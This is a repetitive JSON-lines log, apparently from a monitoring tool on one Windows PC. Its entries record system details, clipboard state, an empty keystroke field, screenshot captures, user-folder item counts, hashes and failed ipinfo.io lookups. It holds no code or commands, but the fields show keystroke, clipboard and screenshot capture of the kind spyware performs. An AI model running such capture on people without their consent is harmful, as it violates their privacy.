{"timestamp": "2025-06-14T07:00:53.014842+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137C50>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "ec32c4417b8d879613a378903478e8ae0e47e24ce8698cd037b720fc6dfad871", "_raw_log_hash": "5454163896d60129a0518959728e2ed39c38940a68703089425cd1bf6272a234"}
{"timestamp": "2025-06-14T07:01:06.625953+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137D90>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "0117506a8994868053514f55831113914b0e1bf3ac9e5db0501ea77f625b29e8", "_raw_log_hash": "68a1bd4882c07588c58854a1522ecd34b51b5ae0408776e905319da98be16e8b"}
{"timestamp": "2025-06-14T07:01:20.165942+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D33F250>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "4d6259e1ec0d5ea4703479c667066400436b81b319362508764f9123d1d6e037", "_raw_log_hash": "c3e3079862fb93115e40740b5fbfe674565081413e0ba1c6ff2e969397ed519b"}
{"timestamp": "2025-06-14T07:01:33.648376+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137610>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "3c23c16763644d0ddba2c52f86f313752ecc0202162f745a4f2be3ba70dda634", "_raw_log_hash": "a29549ffb27d44b4be65b0151a611b545512b0b02325b66970dc177646e90080"}
{"timestamp": "2025-06-14T07:01:47.128625+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137C50>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "79fb36c6ea4efdcbc3c2f136f55ba67c5019dfb18215d4596c80cfdcecf4f088", "_raw_log_hash": "a5f5543287cace030181dab727d803e339715ac2e4b9843d9f47837abcdaa5b4"}
{"timestamp": "2025-06-14T07:02:00.663659+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1374D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "a677dac503ff01de45b39f0f2553f57883bb8f45ff4dccc12cd7ff6a1f416398", "_raw_log_hash": "0c831b56d3a9c388fcb51bd7b7c7963f8abc774cafac0be56f9edbadd23b377c"}
{"timestamp": "2025-06-14T07:02:14.086997+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1379D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "8a5a41a5d4a72544ae4d33989cdfccae59a8fc69c5d0bb8024125e3cd51663ce", "_raw_log_hash": "8ff72f666ee3acf67f19bb2c1b131edea2ab65e4ef818f1633862b76dcb662df"}
{"timestamp": "2025-06-14T07:02:27.720439+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D33FD90>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "ec72abf82a5451d8d38d5499e9da15940e1b2d4e3891631c2c71f09fae86685f", "_raw_log_hash": "c03bdb20c4a9f5b95a8f0823f980603904af981f51ebe5bca9a0da41ea9eaf20"}
{"timestamp": "2025-06-14T07:02:41.263590+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137D90>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "513f2e3ffb5f9ac934157448612dd317de83500f75ce6ea351dca59d1ea2f5e5", "_raw_log_hash": "3ad0b9dced780eb540ad7e495e2cabb5d40b3b607954c8b041a8c1b395f1eafa"}
{"timestamp": "2025-06-14T07:02:54.799004+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1374D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "ab6704129ef1b66de324b4eedfb81989db36f40c8cf5646f7a3f40ca9be2c73b", "_raw_log_hash": "0642544a2fedee030acb5d5f1dd1c532a18196f3d5d2e1f3e577997709aceaed"}
{"timestamp": "2025-06-14T07:03:08.449465+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D33D1D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "314842fb5b04bba6d7aad085028b97df47c2ac7912c9053835437426b4d4d3e9", "_raw_log_hash": "c03393309a4a7f6de0e326380b125e5de4f3ed4800565fe67258304bca217b41"}
{"timestamp": "2025-06-14T07:03:22.046649+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137C50>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "7d803dfc43349b6a0fd0790b16a5a713b313c7465fd6129cd84e38411db49ac8", "_raw_log_hash": "6306eb40b2d7d7f77e7c224f51665d6fe8de804d517f14f7ccb1516255c6be4a"}
{"timestamp": "2025-06-14T07:03:35.595127+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D33ED50>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "86d4cb55a98747d985b4c97f349d936ea4bb869219f49f5d5105b61a006675d7", "_raw_log_hash": "445a3b7825dadcd76aa263c705e643d9745d7e177d7859afb30fa15fdb0edf61"}
{"timestamp": "2025-06-14T07:03:49.122485+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137610>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "319e03c77aea6a0ea0e62f72be7ebaaa477a531629da45e5b1d9f9c794c17b6a", "_raw_log_hash": "7719473cf5323a886cc2c4f0d1f1f858cd53f6b934095b0b394e828e5c84c83a"}
{"timestamp": "2025-06-14T07:04:02.694981+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137110>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "d0eb561c84dc1cddfb59fc1200a5ea910d453f2aa40f6c4b48e9da9682240c35", "_raw_log_hash": "830f264d0d52e31f389ea42890f7fc13a66cf0e81264d47a30288c4dd6ef5f1f"}
{"timestamp": "2025-06-14T07:04:16.183799+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D33D1D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "3bf5d84a4ade01e3118175fcd0dc4c8432244e64e2fb29e39ad2729d86bf5054", "_raw_log_hash": "134ac81f5facaefcc829b601130ac8ff2f77188852e22dc81bc510c516648768"}
{"timestamp": "2025-06-14T07:04:29.702474+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137750>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "1583d62e2613abd9609d806d4e088b591b2f65db71ed7f68ded4c84fcae4835d", "_raw_log_hash": "9b0519d7a2773219a1ebe5f60d07f1f568cc0dd35771b5eea2f225cb4a001d64"}
{"timestamp": "2025-06-14T07:04:43.246571+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D33D090>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "3474a20202333fd0d22514afae54ed6482d7a0ce063114560c0c0dfd196e6a5c", "_raw_log_hash": "8c97e1d8bb8326cc4c901082b595c18a56041164f992e9b194f396a9a07b6f96"}
{"timestamp": "2025-06-14T07:04:56.761576+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137D90>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "3bafe3a502959f0f62770410700e5c9b696ca3af8170a122172c1c8e53b92944", "_raw_log_hash": "33e1366bf5c9c26d5cc0a99059fcb2114353f4ad05d5b08d4f3c49414a7a5d63"}
{"timestamp": "2025-06-14T07:05:10.284472+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137ED0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "3fe8be004a3cece2de28715d1ebec3dfd332d9eb02a231b40da67ac80423d00d", "_raw_log_hash": "a70d7af2219394ed2d7725d30be01151c6c1387860b211f28611be96a89a7e91"}
{"timestamp": "2025-06-14T07:05:23.778906+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137110>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "3a632414f6600d9e0575606294c77ea388a8432c4f6bec9841acedae22575a6d", "_raw_log_hash": "ead8ea56163509392fbca56e9b1df5bca5ab0eedca863f776008236697b9cabf"}
{"timestamp": "2025-06-14T07:05:37.257309+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137D90>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "c113c0e77a4e09550dcb63529b0fc8c90b61ad820ecf86c43f50bf7c9059c7e7", "_raw_log_hash": "983a9a3a0f2f5cae3b546b798f75062dcd49cff02a29e52dde7dd7bd09b4b90c"}
{"timestamp": "2025-06-14T07:05:50.728047+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D33D1D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "0026381526b9c204da42e2662893a745b1ea07f87ce33ae49ca23e31815b9582", "_raw_log_hash": "688701568be7058d8bbdec36f9037b33d9865ff845102b51e974b056b0cdecdc"}
{"timestamp": "2025-06-14T07:06:04.224039+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137B10>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "bac6693ef97dda3944d292dc8f4cf5ae669c00afd3202a9e3f26d839e0437acb", "_raw_log_hash": "cd435b61e4fb2feed91c89dbcf398c56a8766a2002276d62d17b2f3b003b8e65"}
{"timestamp": "2025-06-14T07:06:17.746185+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1374D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "5ac21a085912047e4a6a907cedded7c222f0565444f6e40c59093ba31b3e17f3", "_raw_log_hash": "8ba84185847b6506e33446a2bdd3f97af79615473b0f05d74399469108840dad"}
{"timestamp": "2025-06-14T07:06:31.200317+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137610>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "971da6b154dd5cdbda2a233b42c00ba7accd101030c2e73c94b2035f59fa75c2", "_raw_log_hash": "d5493234aca88f97350b6ef658a3b6fe050e68fdefe278e75986ec04bd827b5e"}
